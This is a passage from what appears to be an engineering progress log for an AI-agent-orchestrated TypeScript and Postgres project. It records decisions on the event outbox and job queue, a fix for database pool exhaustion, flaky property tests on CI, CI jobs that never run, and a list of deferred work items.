- Property-test timeouts now cover `packages/contracts` too (6 `fc.assert` calls that had none — the same
  5s CI flake surface the ci-fix was written for, in the package the ci-fix had not audited). `contracts` is
  the innermost ring and the dependency rule gives it no workspace import, so its `testing/property.ts` is a
  deliberate copy, not an import.

**Empirical note on over-asking:** measured against 54,177 real commit subjects, the aggressive hazard floor
made only 3 of them non-allow (0.006%). Over-asking is cheap; the instinct to soften a security floor for
false positives was not supported by the data.

### WP-04 / WP-05 reconciliation — one queue of record, decided

Both WPs arrived with a loop. The decision, taken on the WP-04 reviewer's analysis and implemented in both:

**`event_dispatch` plus the sweep is the single queue of record.** WP-05's `Jobs` port does **not** carry
individual events; it replaces `OutboxWorker`'s internal `setTimeout` poll with a recurring job that calls
`drain()`, while the NOTIFY subscription still wakes `drain()` for latency. The seam is `DrainScheduler`
(`schedule(name, intervalMs, run)`, job name `events.outbox.sweep`) defined in
`packages/application/src/events/outbox.ts`; WP-05 implements it over `Jobs`.

**Why not make `dispatch(event)` a pg-boss job**, which was the tempting alternative: it duplicates
durability across two queues that disagree after a crash, and pg-boss has no per-stream serialisation — so
ordering would collapse onto `hasEarlierPending` refusing and rescheduling, i.e. a retry storm instead of
deliberate head-of-line blocking.

### WP-04 — the constraint nobody had named

The dispatcher opened a **nested** transaction per handler while the outer dispatch transaction was open,
each taking its own `pool.connect()`. With no `connectionTimeoutMillis`, exhaustion was not an error but a
**permanent silent hang**: N concurrent dispatches with `poolMax <= N` never completed, `APP_DB_POOL_MAX=1`
passed validation and hung on the very first event, and the existing integration test had been hand-tuned to
`max: 8` for 4 dispatchers — exactly 2× — without anyone writing down why.

The fix is worth copying: an implicit constraint became an **enforced invariant**. `EventBus` takes
`maxConcurrentDispatches` (`APP_DISPATCH_MAX_CONCURRENCY`, default 1) with a FIFO slot semaphore;
`requiredConnections = 2 × concurrency + 1`; `createEventing` throws `InsufficientPoolError` naming both
variables and the arithmetic; `APP_DB_CONNECTION_TIMEOUT_MS` (default 10s, floor 100ms) makes exhaustion
fail loudly, leaving the event queued for the sweep. A test pins the failure mode as a prompt error rather
than a hang.

**`MemoryEventing` models no pool** — the one place the fake is kinder than Postgres. A green property run
says nothing about pool sizing. Later WPs must not read it as such.

**Watch at WP-15:** `2 × concurrency + 1` is the right budget only while a handler opens at most one
transaction. A handler that opens a second one silently invalidates it.

## Discovered work (not in plan)

- **Orchestrator parallelism has a ceiling, and it is lower than it looks.** Running three implementers plus
  reviews drove this 14-core host to load average ~143. Two consequences: WP-02's model tests, which measure
  ~1.2s idle, measured 4.2-7.5s under load and *timed out locally* against the old 5s default — the same
  defect CI had already caught; and WP-05's timing evidence had to be gathered deliberately under load to
  mean anything. **Rule for the rest of this session: at most two or three concurrent agents, and never
  judge a timing-sensitive suite while implementers are running.** The 30s property-test cap is sized for
  exactly this, which is the argument for the cap rather than against it.

- **OPEN-QUESTIONS numbering collides when WPs run in parallel.** WP-05's worktree branched from `ca1ae06`,
  before WP-02 landed Q36 (RBAC map) and Q37 (command block-list), so it filed its working-day-calendar
  question as **Q36** too. Renumbered to **Q38** at merge. *Convention from here on:* an implementer must
  re-check the highest existing question number against `main` immediately before writing, and the
  orchestrator renumbers at merge when parallel worktrees collide. The same hazard applies to migration
  file numbers (`0001`-`0009` today) — two parallel WPs both adding `0010` would both pass in isolation and
  collide on merge.
- **pg-boss `persistQueueStats` is pinned off deliberately (WP-05).** `platform_app` has USAGE but not
  CREATE on schema `pgboss` and owns nothing there. Enabled, stats collection works all day and then fails
  at UTC midnight on the background error channel — a failure mode that would look random. Turning it on
  requires a new migration granting CREATE; not done, and the constraint is asserted by an integration test.

- **ci-fix (WP-02, run 34363371997): a property test that only fails on CI.**
  `packages/domain/src/aggregates/task.model.test.ts:531` times out at Vitest's 5000ms default on GitHub's
  2-core runner while passing locally — 795 tests passed, this one failed, every other job green. The gate
  is only as good as its slowest runner, so the fix is an explicit generous timeout for property and
  model-based tests (not a nudged number) plus an audit of the other property tests in `packages/domain`
  for the same fragility. Folded into WP-02a's worktree rather than a fourth worktree, as a separate commit.
  **Lesson for later WPs: a test that passes locally by a hair is not green.** Property tests need headroom
  and a pinned `numRuns`, and CI is the authority, not this machine.

- **CI: the `commitlint` and `dco` jobs never run.** Both are `pull_request`-only, but this session commits
  directly to `main` and never opens a PR, so both report `skipped` on every push (verified on run
  34360466443). WP-00's "DCO check" acceptance criterion is met on paper only. Fix: add `push` to their
  triggers (checking `BASE..HEAD` or the pushed range). Low risk today — lefthook runs commitlint locally
  and every commit so far carries a `Signed-off-by` — but it is an unverified gate. **Do this at the
  5-WP checkpoint.**

- **WP-00 non-blocking, deferred (reviewer round 3):** `CLAUDE.md:20` documents `pnpm eval`, which has no
  `package.json` script yet — add a stub or drop the line at **WP-17**. `CLAUDE.md:15` lists `docker/` and
  `schemas/` which do not exist yet (target layout; `schemas/` lands in WP-01, `docker/` in WP-22).
  `pnpm secrets:scan` (`dir .`) honours `.gitignore`, so a stray local `.env` is invisible to it — CI's
  full-history scan is the real gate.
- **Renovate rule needed** for the `ghcr.io/gitleaks/gitleaks` digest pin in `scripts/gitleaks.mjs`, so the
  pinned image is bumped like any other dependency.
- **Import-boundary lint** enforcing `domain ← application ← infrastructure/integrations ← apps` does not
  exist; the dependency rule currently holds only by absence of cross-package imports. Add it in WP-01/02
  when the first workspace dependency lands.

- ~~**Agent role files carried the broken command:** `.claude/agents/{implementer,reviewer}.md` told
  every subagent to run `pnpm -s verify`.~~ Fixed by the orchestrator in round 3 (all three role
  files, including `architect.md`). The implementer was right to leave harness configuration alone.
- ~~**Verification contract wording (WP-00):** the protocol doc said `pnpm -s verify`.~~ Corrected by
  the orchestrator in round 2.
- **CI workflows still to add (technical/11):** `integration.yml`, `evals.yml`, `nightly-llm.yml`,
  `image.yml`, `base-image.yml`, `release.yml`, `codeql.yml`, `secrets-scan.yml` (weekly trufflehog),
  `mutation.yml`; plus `.github/ISSUE_TEMPLATE/*`, `CODEOWNERS`, `dependabot.yml` (security only),
  `CODE_OF_CONDUCT.md`, `THIRD_PARTY_NOTICES.md`, and the `actionlint`/`hadolint`/`zizmor` steps in
  the lint job (hadolint needs `docker/` from WP-22). Rulesets, required checks and the merge queue
  are GitHub-side configuration a human has to apply.
- **Biome `noConsole`** is not enabled yet; turn it on for server code when pino lands (WP-06).
- **Licence allow-list check** (`pnpm licenses`, TD-017) is not wired; it belongs with WP-23's
  `THIRD_PARTY_NOTICES.md`.
- **Agent registry:** the roles in `.claude/agents/{implementer,reviewer,architect}.md` are not exposed as `subagent_type` values in this session's harness. Workaround used by the orchestrator: spawn a fresh `general-purpose` subagent whose first instruction is to read and obey its role file. Same isolation and protocol; no change needed to the role files.

## Milestone notes

(none)
